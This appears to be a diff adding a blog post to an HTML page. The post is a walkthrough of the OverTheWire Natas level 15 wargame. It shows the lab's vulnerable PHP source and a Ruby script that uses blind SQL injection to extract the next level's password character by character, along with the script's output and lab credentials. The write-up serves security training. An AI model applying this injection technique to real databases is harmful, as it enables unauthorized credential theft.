@@ -100,7 +100,185 @@
       
 
 
-        
+        <div id="main">
+          <div id="content">
+            <div>
+              <article class="hentry" role="article">
+
+                
+                
+
+                <div class="entry-content">
+                  
+                  
+                  <p>Up until now, none of the OverTheWire Natas challenges really gave me that much of an issue. This one however, took me a couple hours to complete. Level 15 is a fun blind sql-injection vulnerability.</p>
+
+<!-- more -->
+
+<p>It starts out with a username check dialog, which pretty much only gives you a binary value as to if a username exists or not.</p>
+
+
+<figure class="img-responsive">
+    
+        <img src="/img/natas15_1.png" />
+    
+    
+</figure>
+
+
+<p>I looked at the source code, and couldn&rsquo;t see any way to inject some SQL to get it to retrieve the password for me.</p>
+
+<pre><code>&lt;html&gt; 
+&lt;head&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://www.overthewire.org/wargames/natas/level.css&quot;&gt;&lt;/head&gt; 
+&lt;body&gt; 
+&lt;h1&gt;natas15&lt;/h1&gt; 
+&lt;div id=&quot;content&quot;&gt; 
+&lt;? 
+
+/* 
+CREATE TABLE `users` ( 
+  `username` varchar(64) DEFAULT NULL, 
+  `password` varchar(64) DEFAULT NULL 
+); 
+*/ 
+
+if(array_key_exists(&quot;username&quot;, $_REQUEST)) { 
+    $link = mysql_connect('localhost', 'natas15', '&lt;censored&gt;'); 
+    mysql_select_db('natas15', $link); 
+     
+    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot;&quot;; 
+    if(array_key_exists(&quot;debug&quot;, $_GET)) { 
+        echo &quot;Executing query: $query&lt;br&gt;&quot;; 
+    } 
+
+    $res = mysql_query($query, $link); 
+    if($res) { 
+    if(mysql_num_rows($res) &gt; 0) { 
+        echo &quot;This user exists.&lt;br&gt;&quot;; 
+    } else { 
+        echo &quot;This user doesn't exist.&lt;br&gt;&quot;; 
+    } 
+    } else { 
+        echo &quot;Error in query.&lt;br&gt;&quot;; 
+    } 
+
+    mysql_close($link); 
+} else { 
+?&gt; 
+
+&lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt; 
+Username: &lt;input name=&quot;username&quot;&gt;&lt;br&gt; 
+&lt;input type=&quot;submit&quot; value=&quot;Check existence&quot; /&gt; 
+&lt;/form&gt; 
+&lt;? } ?&gt; 
+&lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; 
+&lt;/div&gt; 
+&lt;/body&gt; 
+&lt;/html&gt; 
+</code></pre>
+
+<p>I did notice though, that it would verify that a row was returned, so I could inject SQL to brute-force the password. Assuming that the password was 32 digits long (like the previous ones), this could take some time however, since the character set was uppercase, lowercase, and digits. That&rsquo;s up to 62 attempts per digit of the password. I started doing this manually to verify that this was a possibility. With the &ldquo;debug&rdquo; flag on, you can see the query, and that the first digit of the password is not &ldquo;b&rdquo;.</p>
+
+
+<figure class="img-responsive">
+    
+        <img src="/img/natas15_1.png" />
+    
+    
+</figure>
+
+
+<p>I cycled through manually all the lowercase and upper case letters. Once I got partially through the numbers, I got a successful hit! This means that the password starts with a &ldquo;3&rdquo;.</p>
+
+
+<figure class="img-responsive">
+    
+        <img src="/img/natas15_1.png" />
+    
+    
+</figure>
+
+
+<p>The next step for me, was to automate this process. I decided to write some ruby to accomplish it. This code seems to do the job:</p>
+
+<pre><code>require 'uri'
+require 'net/http'
+
+url = URI.parse(&quot;http://natas15.natas.labs.overthewire.org/index.php&quot;)
+http = Net::HTTP.new(url.host, url.port)
+chars = ('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a
+password = &quot;&quot;
+found = false
+
+# 64 was selected, since the password field is a varchar(64)
+# Most likely, since all other passwords were 32 digits long, it'll be that
+(1..64).each do |i|
+ chars.each do |c| 
+  found = false
+  request = Net::HTTP::Post.new(url.request_uri)
+  request.basic_auth(&quot;natas15&quot;, &quot;m2azll7JH6HS8Ay3SOjG3AGGlDGTJSTV&quot;)
+  query = 'natas16&quot; AND SUBSTRING(password, ' + i.to_s + ', 1) LIKE BINARY &quot;' + c
+  request.set_form_data({&quot;username&quot; =&gt; query})
+  response = http.request(request)
+
+  if response.body.include?(&quot;This user exists&quot;)
+   password += c
+   found = true
+   puts &quot;Current pass: #{password}&quot;
+   break
+  end
+ end
+ # If no letter/number was found, it's fairly safe to assume it's done
+ break if !found
+end
+
+</code></pre>
+
+<p>The output shows:</p>
+
+<pre><code>mandreko$ ruby natas15.rb
+Current pass: 3
+Current pass: 3V
+Current pass: 3Vf
+Current pass: 3VfC
+Current pass: 3VfCz
+Current pass: 3VfCzg
+Current pass: 3VfCzga
+Current pass: 3VfCzgaW
+Current pass: 3VfCzgaWj
+Current pass: 3VfCzgaWjE
+Current pass: 3VfCzgaWjEA
+Current pass: 3VfCzgaWjEAc
+Current pass: 3VfCzgaWjEAcm
+Current pass: 3VfCzgaWjEAcmC
+Current pass: 3VfCzgaWjEAcmCQ
+Current pass: 3VfCzgaWjEAcmCQp
+Current pass: 3VfCzgaWjEAcmCQph
+Current pass: 3VfCzgaWjEAcmCQphi
+Current pass: 3VfCzgaWjEAcmCQphiE
+Current pass: 3VfCzgaWjEAcmCQphiEP
+Current pass: 3VfCzgaWjEAcmCQphiEPo
+Current pass: 3VfCzgaWjEAcmCQphiEPoX
+Current pass: 3VfCzgaWjEAcmCQphiEPoXi
+Current pass: 3VfCzgaWjEAcmCQphiEPoXi9
+Current pass: 3VfCzgaWjEAcmCQphiEPoXi9H
+Current pass: 3VfCzgaWjEAcmCQphiEPoXi9Ht
+Current pass: 3VfCzgaWjEAcmCQphiEPoXi9Htl
+Current pass: 3VfCzgaWjEAcmCQphiEPoXi9Htlm
+Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmV
+Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr
+Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3
+Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L
+</code></pre>
+
+<p>And there you go, the password for level 16 shows up as the last line before it quits.</p>
+
+                </div>
+                
+              </article>
+            </div>
+          </div>
+        </div>
 
 
       
@@ -184,15 +362,8 @@
 		<span class="labelpost" data-label="Magazine" data-no="4"></span>
 	</div>
 	<div class='clear'></div>
-	<span class='widget-item-control'>
-		<span class='item-control blog-admin'>
-			<a class='quickedit' href='//www.blogger.com/rearrange?blogID=3868080948025121998&widgetType=HTML&widgetId=HTML2&action=editWidget&sectionId=sidebar' onclick='return _WidgetManager._PopupConfig(document.getElementById("HTML2"));' target='configHTML2' title='Edit'>
-				<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
-			</a>
-		</span>
-	</span>
-	<div class='clear'></div>
 </div>
+
         <div class='widget Label' data-version='1' id='Label1'>
 	<h2>Categories</h2>
 	<div class='widget-content cloud-label-widget-content'>
@@ -637,3 +808,4 @@
 		
 	</body>
 </html>
+
